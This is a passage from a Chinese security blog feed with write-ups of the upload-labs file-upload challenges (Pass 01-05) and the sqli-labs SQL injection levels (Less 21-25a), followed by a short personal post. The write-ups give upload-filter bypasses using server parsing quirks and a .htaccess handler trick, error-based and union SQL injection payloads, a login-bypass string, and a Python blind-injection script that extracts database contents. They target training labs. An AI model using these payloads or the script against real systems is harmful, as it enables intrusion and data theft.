.pht</p></blockquote><p>方法二：解析漏洞<br>尝试采取Apache解析漏洞，因为我是apache服务器所以采取Apache解析漏洞</p><blockquote><ol><li>Apache解析漏洞<br>解析：test.php.(任意不属于黑名单且也不属于Apache解析白名单的名称)，比如test.php.lala<br>描述：一个文件名为test.x1.x2.x3的文件，apache会从x3的位置开始尝试解析，如果x3不属于apache能够解析的扩展名，那么apache会尝试去解析x2，直到能够解析到能够解析的为止，否则就会报错</li></ol></blockquote><blockquote><ol start="2"><li>IIS解析漏洞<br>解析 ：test.asp/(任意文件名)|test.asp；(任意文件名) | (任意文件名)/(任意文件名).php<br>描述：IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，<br>那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有”.asp;”<br>会优先按asp来解析<br>IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL<br>后面追加上字符串”/任意文件名.php”就会按照php的方式去解析；</li></ol></blockquote><blockquote><ol start="3"><li>Nginx解析漏洞<br>解析： (任意文件名)/(任意文件名).php | (任意文件名).php<br>描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php<br>的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。</li></ol></blockquote><p>我构造了一个Assert_Post.php.aaa文件（后来发现不能使用aaa后缀而是要特定的后缀如.arex）结果直接上传了个</p><p><img src="https://i.imgur.com/G5M5GvV.png" alt=""><br>进行查询了很多个apache不可解析的文件后缀，结果都上传成功了？？？发现，并不是上传后会把它变成php格式文件，而是解析的时候会当成php文件来解析</p><p>方法三：.htaccess上传<br>可以看到这里黑名单并没有限制.htaccess文件的上传<br>文件内容如下</p><blockquote><filesmatch "aaa"=""><br>    SetHandler application/x-httpd-php<br></filesmatch></blockquote><p>当apache在解析该目录下的php时，就会按照.htaccess中的要求去解析aaa文件解析成php<br><img src="https://i.imgur.com/QBM3e7y.png" alt=""></p><blockquote><p>备注其余配置问题导致漏洞<br>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p></blockquote><p>即我们可以在.htaccess 中添加这两句就可以将JPG以php执行，或者只要文件中含有php就可以以php执行</p><h3 id="Pass-04-服务端黑名单加强"><a href="#Pass-04-服务端黑名单加强" class="headerlink" title="Pass-04 服务端黑名单加强"></a>Pass-04 服务端黑名单加强</h3><p>查看源码<br><img src="https://i.imgur.com/ZxluhF6.png" alt=""><br>发现这里增加了对特殊php后缀的黑名单，不过却没有过滤.htaccess<br>这里我们可以采取第三关的第二种和第三种方式进行绕过</p><blockquote><p>.htaccess是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件。<br>要想使.htaccess文件生效，需要两个条件，<br>一是在Apache的配置文件中写上：AllowOverride All  Apache的配置文件一般在/etc/httpd/conf下面的httpd.conf<br>二是Apache要加载mod_Rewrite模块。加载该模块，需要在Apache的配置文件中写上：LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</p></blockquote><h3 id="Pass-05-服务端黑名单超级加强"><a href="#Pass-05-服务端黑名单超级加强" class="headerlink" title="Pass-05 服务端黑名单超级加强"></a>Pass-05 服务端黑名单超级加强</h3><p>先上传个.htaccess文件，失败了<br>查看源码</p><blockquote><p>“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”</p></blockquote><p>这么多黑名单，嗯以后如果不是这题其他文件上传题目可以看看有没有没有禁用这些黑名单的。<br><img src="https://i.imgur.com/GfSJ2Mt.png" alt=""><br>方法一:构造.php. .后缀<br>因为deldot只删除了一个点，而在windows下后缀为空格或者.的会被忽略，并且在linux下.为后缀的也同样会被当成php来解析<br>（这里我上传了个没有后缀的文件，或许apache会将它也解析成php文件大概把？）<br><img src="https://i.imgur.com/K9bCVfV.png" alt=""></p><p><img src="https://i.imgur.com/razmpdo.png" alt=""><br>方法二：大小写绕过<br>这里并没有忽略大小写故我们可以构造.PHP文件后缀进行绕过，经过尝试发现上传成功</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://zhuanlan.zhihu.com/p/52099683" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/52099683</a><br><a href="http://lawlietweb.com/2018/06/07/upload-labs/" target="_blank" rel="noopener">http://lawlietweb.com/2018/06/07/upload-labs/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      关于upload-labs Pass 01 ~ 05的writeup
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="文件上传" scheme="https://museljh.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs less 21 ~ 25a</title>
    <link href="https://museljh.github.io/2019/02/09/sqli-labs%20less%2021%20~%2025/"/>
    <id>https://museljh.github.io/2019/02/09/sqli-labs less 21 ~ 25/</id>
    <published>2019-02-09T15:33:50.000Z</published>
    <updated>2019-02-10T09:40:15.385Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>SQLI-LABS是一个学习SQLI的平台以下实验包适用于GET和POST场景,可以通过git clone <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a> 来搭建属于自己的一个sql注入练习靶场</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Less-21-cookie注入-–-基于错误-–-复杂-字符串"><a href="#Less-21-cookie注入-–-基于错误-–-复杂-字符串" class="headerlink" title="Less 21 cookie注入 – 基于错误 – 复杂 - 字符串"></a>Less 21 cookie注入 – 基于错误 – 复杂 - 字符串</h3><p><img src="https://i.imgur.com/fy5rGML.png" alt=""></p><p><img src="https://i.imgur.com/DQj38KF.png" alt=""><br>可以看出username和password都有被过滤，关键在于cookie浏览代码，可以看出一旦用户登入，username就会以base64的形式存入cookie中<br><img src="https://i.imgur.com/oBdYVuz.png" alt=""><br>并且通过这段代码查询出该用户的资料显示在页面上<br>一般情况下这样登陆界面都会有用户注册界面，假设我们现在已经有了用户admin<br>通过登入并且修改cookie进行sql注入，这里我们采取update报错注入（注：updatexml为xml替换语句,如果想详细了解updatexml可以通过在mysql下help updatexml得知具体细节）<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 &apos; or updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br><span class="line"></span><br><span class="line">MSAnIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSkj</span><br></pre></td></tr></table></figure></p><p>我们发现成功爆出当前使用数据库名称<br><img src="https://i.imgur.com/qBmcdP8.png" alt=""><br>其他方式太多了，就不一一举例</p><h3 id="Less-22-cookie注入-–-基于错误-–-双引号-字符串"><a href="#Less-22-cookie注入-–-基于错误-–-双引号-字符串" class="headerlink" title="Less 22 cookie注入 – 基于错误 – 双引号 - 字符串"></a>Less 22 cookie注入 – 基于错误 – 双引号 - 字符串</h3><p>这题与上题几乎一样，只是将单引号改为双引号就可以了<br><img src="https://i.imgur.com/mjCFZwc.png" alt=""><br>这里我们换成extractvalue报错注入（注：extractvalue为xml查询语句，同样想要知道细节可以通过在mysql下help extractvalue得知 ）<br>paload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 &quot; or extractvalue(1, concat(0x5c, (select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)))#</span><br><span class="line"></span><br><span class="line">MSAiIG9yIGV4dHJhY3R2YWx1ZSgxLCBjb25jYXQoMHg1YywgKHNlbGVjdCB0YWJsZV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9J3NlY3VyaXR5JyBsaW1pdCAwLDEpKSkj</span><br></pre></td></tr></table></figure></p><h3 id="Less-23-基于错误-–-无评论"><a href="#Less-23-基于错误-–-无评论" class="headerlink" title="Less 23 基于错误 – 无评论"></a>Less 23 基于错误 – 无评论</h3><p>源码如下：<br><img src="https://i.imgur.com/8dZInCh.png" alt=""><br>这里id，虽然只有被单引号包住，但是却有过滤</p><blockquote><p>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</p></blockquote><p>简单的说preg_replace — 是一个执行一个正则表达式的搜索和替换的函数，这里的意思是将–,#替换成空格也就是说我们不能通过这两种方式进行闭合，但我们可以通过 or ‘1 这样的形式构造出如下这种形式进行注释<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos; xxx or &apos;1&apos;  LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p><p>这次我们换成union注入<br>pyload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.7/sqli-labs/Less-23/index.php?id=0&apos; union select 1,2,database() or &apos;1</span><br></pre></td></tr></table></figure></p><p>id=0，为什么要用0，因为sql语句执行了两个select语句，如果第一个查询的出来就无法使第二个select语句得到我们想要的效果</p><h3 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less 24 二次注入"></a>Less 24 二次注入</h3><p>这关不同以往是一个完整的网站，有登入，注册，以及找回密码<br>首先我们先审计下源码，看看有没有可以利用的sql语句<br>首先进入index.php，没有发现什么特殊地方，于是接着查找login.php<br><img src="https://i.imgur.com/8O1VOk8.png" alt=""><br>可以看出这里有sql语句，但是有过滤函数，我们转到过滤函数看看有没可以利用的地方,经过查询可以发现这是一个php内置的函数，它的作用如下（这个函数在php5.5后已经被弃用）</p><blockquote><p>mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false，受影响字符\x，00，\n，\r，\’，”，\x1a,详细可看<a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">这里</a></p></blockquote><p>一番审计后，在pass_change.php中发现了没有过滤的变量如下：<img src="https://i.imgur.com/uU14iZd.png" alt=""></p><p>我们可以发现，如果没有用户登入是无法进入pass_change.php页面的<img src="https://i.imgur.com/ll8DjNj.png" alt=""><br>这里我们可以发现session[‘username’]是直接由新用户名字组成的，于是我们构成pop链 :注册新用户=&gt;用新用户的账号进行注入=&gt;进入更改密码界面进行真正注入于是达成二次注入的效果<br>首先先随便用一个账号密码登入，用bp改包<img src="https://i.imgur.com/BPiVHLW.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&apos;#&amp;login_password=aa&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></p><p>这样可以绕过密码验证，然后再更改密码，这样就可以将admin的密码更改了<br>（注释:这里可能会遇到登入后没有界面情况可以在<a href="https://www.cnblogs.com/lcamry/p/5763008.html" target="_blank" rel="noopener">这里解决<a>）</a></a></p><h3 id="Less-25-过滤了or和and"><a href="#Less-25-过滤了or和and" class="headerlink" title="Less 25 过滤了or和and"></a>Less 25 过滤了or和and</h3><p> <img src="https://i.imgur.com/4FFWRfe.png" alt=""><br>preg_replace进行过滤or和and通过这个函数进行<br>我的第一个想法是通过如下形式进行绕过，不过不行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; o/**/r sleep(5)#</span><br></pre></td></tr></table></figure><p>尝试下改下大小写，结果不行，查下正则在i模式的匹配，忽略大小写，我们只能尝试下or和and对应的逻辑符号进行注入了</p><blockquote><p>$a &amp;&amp; $b    And（逻辑与）<br>$a || $b    Or（逻辑或）</p></blockquote><p><img src="https://i.imgur.com/yiSZHEc.png" alt=""><br>发现可以(注:这里要记得进行url编码，不然会失败)<br>当然这里还可以通过双写绕过oorr，aandnd，毕竟这里只有过滤一次</p><h3 id="Less-25a-用-OR-和-AND-欺骗-与盲注"><a href="#Less-25a-用-OR-和-AND-欺骗-与盲注" class="headerlink" title="Less 25a 用 OR 和 AND 欺骗 与盲注"></a>Less 25a 用 OR 和 AND 欺骗 与盲注</h3><p>这里我们有两个方法，一个是联合注入一个是sleep盲注(注:sleep还可以用这个函数替换BENCHMARK(1000000,MD5(‘A’)))<br>payload1联合注入<br><img src="https://i.imgur.com/RWjzMlt.png" alt=""><br>由于把输出的给关了，只能盲注了<br>盲注的时候怎么弄也不行(我个人认为是可以的 不过貌似出现了意外不行 可能是配置出现什么问题)<br><img src="https://i.imgur.com/cTJvxih.png" alt=""><br>本地测试时可以的<br><img src="https://i.imgur.com/OIEh5XW.png" alt=""><br>实际测试的时候却会出现问题。<br>脚本如下仅做参考</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">#A:65,Z:90 a:97,z:122,0:48,9:57</span><br><span class="line">brr=[]</span><br><span class="line">url=&apos;http://192.168.43.7/sqli-labs/Less-26/?id=1&apos;</span><br><span class="line">str_all=&quot; 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;+-*/=#&quot;</span><br><span class="line">r=requests.session()</span><br><span class="line">def test1(x):</span><br><span class="line">arr=[]</span><br><span class="line">for i in range(1,20):</span><br><span class="line">for j in str_all:</span><br><span class="line">starttime=time.time()</span><br><span class="line">payload=&quot; anandd if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit &#123;&#125;,1),&#123;&#125;,1)=&apos;&#123;&#125;&apos;),sleep(5),0) --+&quot;.format(str(x),str(i),str(j))</span><br><span class="line">a=url+payload</span><br><span class="line">res=r.get(a)</span><br><span class="line">print a</span><br><span class="line">if j == &apos;#&apos;:</span><br><span class="line">return j</span><br><span class="line">if time.time()-starttime &gt;4:</span><br><span class="line">if j==&apos; &apos;:</span><br><span class="line">brr.append(q)</span><br><span class="line">return j</span><br><span class="line">arr.append(j)</span><br><span class="line">break</span><br><span class="line">q=&apos;&apos;.join(arr)</span><br><span class="line">print q</span><br><span class="line">def test2(x):</span><br><span class="line">arr=[]</span><br><span class="line">for i in range(1,20):</span><br><span class="line">for j in str_all:</span><br><span class="line">starttime=time.time()</span><br><span class="line">payload=payload=&quot; anandd if((substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; anandd table_name=&apos;users&apos; limit &#123;&#125;,1),&#123;&#125;,1)=&apos;&#123;&#125;&apos;),sleep(5),0) --+&quot;.format(str(x),str(i),str(j))</span><br><span class="line">a=url+payload</span><br><span class="line">res=r.get(a)</span><br><span class="line">print a</span><br><span class="line">if j == &apos;#&apos;:</span><br><span class="line">return j</span><br><span class="line">if time.time()-starttime &gt;4:</span><br><span class="line">if j==&apos; &apos;:</span><br><span class="line">brr.append(q)</span><br><span class="line">return j</span><br><span class="line">arr.append(j)</span><br><span class="line">break</span><br><span class="line">q=&apos;&apos;.join(arr)</span><br><span class="line">print q</span><br><span class="line">def test3(x):</span><br><span class="line">arr=[]</span><br><span class="line">for i in range(1,20):</span><br><span class="line">for j in str_all:</span><br><span class="line">starttime=time.time()</span><br><span class="line">payload=&quot; anandd if((substr((select username from users limit &#123;&#125;,1),&#123;&#125;,1)=&apos;&#123;&#125;&apos;),sleep(5),0) --+&quot;.format(str(x),str(i),str(j))</span><br><span class="line">a=url+payload</span><br><span class="line">res=r.get(a)</span><br><span class="line">print a</span><br><span class="line">if j == &apos;#&apos;:</span><br><span class="line">return j</span><br><span class="line">if time.time()-starttime &gt;4:</span><br><span class="line">if j==&apos; &apos;:</span><br><span class="line">brr.append(q)</span><br><span class="line">return j</span><br><span class="line">arr.append(j)</span><br><span class="line">break</span><br><span class="line">q=&apos;&apos;.join(arr)</span><br><span class="line">print q</span><br><span class="line">def databasenamemid():</span><br><span class="line">#求数据库的名字</span><br><span class="line">arr=[]</span><br><span class="line">for i in range(1,9):</span><br><span class="line">for j in str_all:</span><br><span class="line">starttime=time.time()</span><br><span class="line">payload=&quot; anandd if((substr((select database()),&#123;&#125;,1)=&apos;&#123;&#125;&apos;),sleep(5),0) --+&quot;.format(str(i),str(j))</span><br><span class="line">a=url+payload</span><br><span class="line">res=r.get(a)</span><br><span class="line">print a</span><br><span class="line">if j==&apos;#&apos;:</span><br><span class="line">return</span><br><span class="line">if time.time()-starttime &gt;4:</span><br><span class="line">arr.append(j)</span><br><span class="line">break</span><br><span class="line">b=&apos;&apos;.join(arr)</span><br><span class="line">print b</span><br><span class="line">def tablesname():</span><br><span class="line">#求表名</span><br><span class="line">x=0</span><br><span class="line">while x &lt; 10:</span><br><span class="line">j=test1(x)</span><br><span class="line">if j == &apos;#&apos;:</span><br><span class="line">break</span><br><span class="line">x=x+1</span><br><span class="line">print(brr)</span><br><span class="line">print(brr)</span><br><span class="line"></span><br><span class="line">def columsname():</span><br><span class="line">#求列名</span><br><span class="line">x=0</span><br><span class="line">while x &lt; 10:</span><br><span class="line">j=test2(x)</span><br><span class="line">if j == &apos;#&apos;:</span><br><span class="line">break</span><br><span class="line">x=x+1</span><br><span class="line">print(brr)</span><br><span class="line">print(brr)</span><br><span class="line">def colums():</span><br><span class="line">#求字段名</span><br><span class="line">x=0</span><br><span class="line">while x &lt; 10:</span><br><span class="line">j=test3(x)</span><br><span class="line">if j == &apos;#&apos;:</span><br><span class="line">break</span><br><span class="line">x=x+1</span><br><span class="line">print(brr)</span><br><span class="line">print(brr)</span><br><span class="line">databasenamemid()</span><br><span class="line">#tablesname()</span><br><span class="line">#columsname()</span><br><span class="line">#colums()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      关于SQLI-LABS less 21 ~ 25a的writeup
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="sql注入" scheme="https://museljh.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>新的一年，新的开始</title>
    <link href="https://museljh.github.io/2019/02/05/%E6%96%B0%E7%9A%84%E4%B8%80%E5%B9%B4%EF%BC%8C%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/"/>
    <id>https://museljh.github.io/2019/02/05/新的一年，新的开始/</id>
    <published>2019-02-05T13:39:11.000Z</published>
    <updated>2019-02-05T14:22:26.113Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote><p>这是我的第一篇博客，也是今年的第一天，希望今天是一切新的开始，也希望未来一年一切顺利。</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote><p>大概很早之前我就想搭建一个属于自己的博客，<br>一直都没有机会，原本来打算暑假开始后十天左右就开始着手搭建一个博客，但是由于种种原因拖了将近一个星期，不过能够在这个新年的第一天发表我的第一篇博客，也算是十分圆满。<br>过去的一年已经悄悄过去，在这一年中,我经历了很多挫折，总的来说，很多时候自己付出了努力，但是却没有取得希望的结果，这有自己的一部分自己的原因，也有一部分外部原因。<br>或许是运气使然，偶然的机会下，我接触到了安全这个行业，同时也给我一个新的努力方向，希望未来能够通过努力，能获得自己想要的结果。</p></blockquote>]]></content>
    
    <summary type="html">
    
      这是我的第一篇博客，也是今年的第一天，希望今天是一切新的开始，也希望未来一年一切顺利。
    
    </summary>
    
      <category term="随笔" scheme="https://museljh.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="https://museljh.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
